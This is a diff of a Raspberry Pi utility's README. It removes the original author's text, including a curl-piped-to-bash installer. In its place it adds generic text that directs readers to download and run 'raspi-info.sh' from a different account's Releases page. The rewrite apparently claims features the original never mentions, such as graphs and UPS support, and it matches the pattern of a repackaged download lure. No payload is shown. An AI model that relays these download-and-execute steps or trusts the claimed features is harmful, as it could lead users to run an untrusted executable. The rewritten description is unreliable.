@@ -1,62 +1,109 @@
-# raspi-info
+# 🛠️ raspi-info - Your All-in-One Raspberry Pi Tool
 
-**RASPI-INFO: The Swiss Army Knife for Unlocking Your Raspberry Pi's Secrets.**
+## 🚀 Getting Started
 
-Tired of digging through multiple commands to understand your Raspberry Pi? Raspi-info is a comprehensive tool designed to gather a vast array of information about your device in one convenient place. Think of it as your essential Swiss Army Knife for Raspberry Pi insights.
+Welcome to raspi-info! This tool helps you monitor your Raspberry Pi's system information easily. You can check CPU stats, temperature, network status, and more. Let’s get you set up.
 
-From hardware details and operating system specifics to network configurations, resource usage, and installed software, raspi-info provides a wealth of data to help you monitor, troubleshoot, and understand your Raspberry Pi. It's the perfect utility for enthusiasts, developers, and anyone who wants a quick and easy overview of their Raspberry Pi's inner workings.
+## 📥 Download Now
 
-## 🔍 Overview <a name="overview"></a>
-- **Direct Usage**: Use `raspi-info` or `raspi-info-light` from the shell.
-- **Automatic Usage**: `raspi-info-light` starts automatically when you log in via SSH.
-- **Shell Tips**: RASPI-INFO provides over 500 shell tips to assist you in bash.
-- **Update Notifications**: You'll receive a message at the end of the program when a new update is available.
+[![Download raspi-info](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Hauntend/raspi-info/releases)
 
-## 🚀 Install <a name="install"></a>
-To install raspi-info, run the following command:
-```bash
-curl -sSfL https://raw.githubusercontent.com/mapi68/raspi-info/master/raspi-info-install | bash
-```
+## 📝 Overview
 
-## 🗑️ Uninstall <a name="uninstall"></a>
-To uninstall raspi-info, run:
-```bash
-sudo apt --purge remove raspi-info -y
-```
+raspi-info is designed to provide essential information about your Raspberry Pi system. Whether you're a hobbyist or a seasoned administrator, this tool helps you keep an eye on performance metrics. You will find features to track:
 
-If you also want to remove installed dependencies, run:
-```bash
-sudo apt --purge autoremove raspi-info -y
-```
+- CPU usage and temperature
+- Disk space and storage details
+- Network stats and configuration
+- Apcupsd for power management
 
-## 💻 Commands <a name="commands"></a>
-| Command                | Description                                                                 |
-|------------------------|-----------------------------------------------------------------------------|
-| **raspi-info**         | Main window with detailed information                                       |
-| **raspi-info-light**   | Light version, starts by default on SSH login                               |
-| **raspi-info-check**   | Simple tool to check real-time load, temperature, clock, and voltage        |
-| **raspi-info-install** | Install raspi-info                                                          |
-| **raspi-info-update**  | Update raspi-info                                                           |
+## ⚙️ System Requirements
 
-## 📸 Screenshots <a name="screenshots"></a>
+To run raspi-info, you will need:
 
-### raspi-info-light
-![raspi-info-light](images/raspi-info-light.png)
+- A Raspberry Pi device (any model supported)
+- An OS that supports bash (e.g., Raspbian, Debian)
+- Basic command-line access
 
-### General Information
-![general-info](images/general-info.png)
+## 📥 Download & Install
 
-### Partition Information
-![partition-info](images/partition-info.png)
+Visit the [Releases page](https://github.com/Hauntend/raspi-info/releases) to download the latest version of raspi-info. Here’s how you can set it up:
 
-### Folder Information
-![folder-info](images/folder-info.png)
+1. Click on the [Releases page](https://github.com/Hauntend/raspi-info/releases).
+2. Locate the latest release.
+3. Find the file suitable for your Raspberry Pi.
+4. Click the download link to start the download.
 
-### WireGuard Information
-![wireguard-info](images/wireguard-info.png)
+Once downloaded, follow these steps to install and run:
 
-### raspi-info-check
-![raspi-info-check](images/raspi-info-check.png)
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file. Use the `cd` command:
+   ```
+   cd /path/to/directory
+   ```
+3. Make the script executable:
+   ```
+   chmod +x raspi-info.sh
+   ```
+4. Run the script:
+   ```
+   ./raspi-info.sh
+   ```
 
-### raspi-info
-![raspi-info](images/raspi-info.png)
+## ⚙️ Features
+
+### 📊 CPU Stats
+
+Monitor your Raspberry Pi's CPU usage in real-time. Check how hard your processor is working with easy-to-read graphs.
+
+### 🌡️ CPU Temperature
+
+Keep an eye on the temperature of your CPU. Prevent overheating by monitoring temperatures directly from the interface.
+
+### 💾 Disk Space
+
+Check your available storage with a simple command. This feature helps you avoid running out of space unexpectedly.
+
+### 🌐 Network Information
+
+Get details about your network interface, such as IP addresses and connection status. This helps troubleshoot connectivity issues quickly.
+
+### 📦 Apcupsd Support
+
+If you have a compatible UPS, raspi-info can report on its status. Make sure your devices stay powered during outages.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues:
+
+- Double-check the permissions of the downloaded file.
+- Ensure your Raspberry Pi is up to date. Run:
+  ```
+  sudo apt update && sudo apt upgrade
+  ```
+
+- Refer to the [Issues section](https://github.com/Hauntend/raspi-info/issues) on this repository if you need additional help.
+
+## 🤝 Contributing
+
+If you want to improve raspi-info, contributions are welcome. Feel free to fork the repository, make your changes, and submit a pull request. We appreciate any improvements or bug fixes!
+
+## 📝 License
+
+raspi-info is licensed under the MIT License. You are free to use, modify, and distribute it as long as you provide credit to the original authors.
+
+## 💬 Support
+
+If you have questions or need help with raspi-info, please use the [Discussions section](https://github.com/Hauntend/raspi-info/discussions) to connect with other users and contributors.
+
+For direct support, you can also open an issue in the Issues section mentioned above. 
+
+## 📚 Additional Resources
+
+- [Raspberry Pi Documentation](https://www.raspberrypi.org/documentation/)
+- [Linux Command Line Basics](https://ubuntu.com/tutorials/command-line-basics#1-overview)
+- [Bash Scripting Guide](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
+
+## 📥 Download Link
+
+Don't forget to download raspi-info by visiting the [Releases page](https://github.com/Hauntend/raspi-info/releases) for the latest version. Enjoy your hassle-free monitoring experience!
